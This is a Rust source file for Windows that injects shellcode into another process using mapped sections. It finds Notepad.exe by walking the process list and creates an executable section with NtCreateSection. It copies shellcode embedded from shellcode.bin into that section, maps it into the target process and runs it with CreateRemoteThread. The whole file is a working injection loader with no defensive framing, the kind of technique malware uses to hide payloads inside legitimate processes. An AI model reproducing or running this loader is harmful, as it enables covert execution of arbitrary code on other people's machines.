#![allow(deprecated)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
use std::{intrinsics::copy_nonoverlapping, mem::transmute, os::raw::c_void, ptr::null_mut};

use windows_sys::{
    Wdk::{
        Storage::FileSystem::NtCreateSection,
        System::{
            Memory::{NtMapViewOfSection, NtUnmapViewOfSection},
            SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
        },
    },
    Win32::{
        Foundation::{CloseHandle, STATUS_INFO_LENGTH_MISMATCH},
        System::{
            Threading::{
                CreateRemoteThread, GetCurrentProcess, OpenProcess, PROCESS_QUERY_INFORMATION,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
            },
            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

pub type SECTION_INHERIT = i32;
pub const ViewShare: SECTION_INHERIT = 1i32;
pub type PAGE_PROTECTION_FLAGS = u32;
pub const PAGE_EXECUTE_READ: PAGE_PROTECTION_FLAGS = 32u32;
pub const PAGE_EXECUTE_READWRITE: PAGE_PROTECTION_FLAGS = 64u32;
pub const PAGE_READWRITE: PAGE_PROTECTION_FLAGS = 4u32;
pub const SEC_COMMIT: PAGE_PROTECTION_FLAGS = 134217728u32;
pub type SECTION_FLAGS = u32;
pub const SECTION_ALL_ACCESS: SECTION_FLAGS = 983071u32;

fn get_pid(process_name: &str) -> u32 {
    let mut pid = 0;
    unsafe {
        let mut return_length = 0;
        let mut status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("Failed to query system information.");
            return pid;
        }

        let buff_size = return_length as usize;
        let buffer = vec![0u8; buff_size];
        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_ptr() as *mut c_void,
            buff_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("Failed to query system information.");
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && process_name.eq_ignore_ascii_case(
                    String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn main() {
    let target_process = "Notepad.exe";
    let pid = get_pid(target_process);

    if pid == 0 {
        println!("[-] Target process not found.");
        return;
    }

    println!("[+] {} process found with PID: {}", target_process, pid);

    unsafe {
        let proc_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            0,
            pid,
        );

        if proc_handle.is_null() {
            println!("[-] Failed to open target process.");
            return;
        }

        let mut section_handle = null_mut();
        let section_size = SHELLCODE.len() as i64;

        let mut status = NtCreateSection(
            &mut section_handle as *mut _,
            SECTION_ALL_ACCESS,
            null_mut(),
            &section_size as *const i64,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        );
        if status != 0 {
            println!("[-] Failed to create section.");
            CloseHandle(proc_handle);
            return;
        }

        println!("[+] Section created: {:?}", section_handle);

        let mut base_addr: *mut c_void = null_mut();
        let mut size = SHELLCODE.len() as usize;
        status = NtMapViewOfSection(
            section_handle,
            GetCurrentProcess(),
            &mut base_addr,
            0,
            0,
            null_mut(),
            &mut size,
            ViewShare,
            0,
            PAGE_READWRITE,
        );

        if status != 0 {
            println!("[-] Failed to map view of section.");
            CloseHandle(section_handle);
            CloseHandle(proc_handle);
            return;
        }

        println!("[+] Mapped view of section at address: {:?}", base_addr);

        copy_nonoverlapping(SHELLCODE.as_ptr(), base_addr as *mut u8, SHELLCODE.len());

        println!("[+] Shellcode copied to section.");

        NtUnmapViewOfSection(GetCurrentProcess(), base_addr);

        println!("[+] Unmapped view of section from current process.");

        let mut remote_buffer = null_mut();
        status = NtMapViewOfSection(
            section_handle,
            proc_handle,
            &mut remote_buffer,
            0,
            0,
            null_mut(),
            &mut size,
            ViewShare,
            0,
            PAGE_EXECUTE_READ,
        );

        if status != 0 {
            println!("[-] Failed to map view of section in target process.");
            CloseHandle(section_handle);
            CloseHandle(proc_handle);
            return;
        }

        println!(
            "[+] Mapped view of section in target process at address: {:?}",
            remote_buffer
        );

        let mut thread_id = 0;
        let thread_handle = CreateRemoteThread(
            proc_handle,
            null_mut(),
            0,
            transmute(remote_buffer),
            null_mut(),
            0,
            &mut thread_id,
        );

        if thread_handle.is_null() {
            println!("[-] Failed to create remote thread.");
            NtUnmapViewOfSection(proc_handle, remote_buffer);
            CloseHandle(section_handle);
            CloseHandle(proc_handle);
            return;
        }

        println!("[+] Thread created with ID: {}", thread_id);

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        CloseHandle(proc_handle);
    }
}
